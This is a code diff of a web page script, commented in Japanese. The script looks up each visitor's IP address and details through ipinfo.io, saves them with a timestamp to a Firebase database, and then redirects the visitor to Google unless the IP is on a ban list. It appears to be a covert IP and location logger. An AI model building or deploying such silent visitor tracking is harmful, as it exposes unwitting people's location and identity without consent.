@@ -31,7 +31,7 @@
         const db = firebase.database();
 
         // IP BANリスト
-        const bannedIPs = ['180.199.223.65', '180.199.223.65']; // BANしたいIPアドレスをここに追加
+        const bannedIPs = ['180.199.223.65', '180.199.223.5']; // BANしたいIPアドレスをここに追加
 
         // IPアドレスを取得し、処理を実行
         fetch('https://ipinfo.io?callback')
@@ -56,11 +56,11 @@
                         const timestamp = new Date().toLocaleString();
                         document.getElementById("timestamp").textContent = timestamp;
 
-                        // Firebase Realtime Databaseにデータを保存
+                        // Firebase Realtime Databaseにデータを送信
                         const dataRef = db.ref('user-data');
                         const newDataRef = dataRef.push();
 
-                        // データをオブジェクトとして保存
+                        // データをオブジェクトとして送信
                         const userData = {
                             timestamp: timestamp,
                             ip: ip,
@@ -70,14 +70,16 @@
 
                         newDataRef.set(userData)
                             .then(() => {
-                                console.log('データがFirebaseに保存されました。');
+                                console.log('データがFirebaseに送信されました。');
                             })
                             .catch(error => {
-                                console.error('データの保存中にエラーが発生しました: ', error);
+                                console.error('データの送信中にエラーが発生しました: ', error);
                             });
 
                         // IPがBANされていない場合、Googleにリダイレクト
-                        window.location.href = 'https://www.google.com';
+                        if (!bannedIPs.includes(ip)) {
+                            window.location.href = 'https://www.google.com';
+                        }
                     })
                     .catch(error => {
                         console.error('位置情報の取得中にエラーが発生しました: ', error);
